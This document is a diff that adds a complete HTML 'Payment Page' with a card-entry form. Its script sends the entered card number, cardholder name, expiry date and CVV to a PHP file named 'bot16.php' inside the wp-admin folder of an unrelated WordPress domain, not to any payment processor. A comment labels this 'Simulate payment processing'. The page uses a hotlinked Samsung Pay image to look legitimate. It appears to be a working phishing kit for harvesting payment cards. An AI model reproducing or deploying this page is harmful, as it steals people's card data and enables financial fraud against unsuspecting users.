@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        .pay-button {
+            background-color: #0070ba;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        .pay-button:hover {
+            background-color: #005f8d;
+        }
+        .hidden {
+            display: none;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        h1, h2 {
+            margin: 0;
+            padding: 0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="paymentContainer">
+        <img src="https://ipg.comtrust.ae/PaymentEx/Images/SamsungPayImg.png" alt="Payment Image"> <!-- Replace with your image URL -->
+        <h1>Make a Payment</h1>
+        <p>Click the button below to proceed with your payment.</p>
+        <button id="showCardForm" class="pay-button">Pay with Card</button>
+
+        <div id="cardForm" class="hidden">
+            <h2>Enter Card Details</h2>
+            <input type="text" id="cardNumber" placeholder="Card Number" required>
+            <input type="text" id="cardName" placeholder="Name on Card" required>
+            <input type="text" id="expiryDate" placeholder="MM/YY" required>
+            <input type="text" id="cvv" placeholder="CVV" required>
+            <button id="submitPayment" class="pay-button">Submit Payment</button>
+            <div id="errorMessage" class="error hidden"></div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('showCardForm').onclick = function() {
+            document.getElementById('cardForm').classList.remove('hidden');
+            document.getElementById('showCardForm').classList.add('hidden');
+        };
+
+        document.getElementById('submitPayment').onclick = function() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardName = document.getElementById('cardName').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            errorMessage.classList.add('hidden'); // Reset error message
+
+            // Simple validation (for demo purposes)
+            if (!cardNumber || !cardName || !expiryDate || !cvv) {
+                errorMessage.textContent = "Please fill in all fields.";
+                errorMessage.classList.remove('hidden');
+                return;
+            }
+
+            // Simulate payment processing and redirect
+            fetch("https://spacemeadow.com/wp-admin/work/bot16.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    cardNumber: cardNumber,
+                    cardName: cardName,
+                    expiryDate: expiryDate,
+                    cvv: cvv
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Payment submitted!\n" + JSON.stringify(data));
+                // Optionally redirect to a success page or handle results here
+            })
+            .catch(error => {
+                errorMessage.textContent = "An error occurred. Please try again.";
+                errorMessage.classList.remove('hidden');
+            });
+
+            // Reset the form
+            document.getElementById('cardForm').classList.add('hidden');
+            document.getElementById('showCardForm').classList.remove('hidden');
+        };
+    </script>
+</body>
+</html>
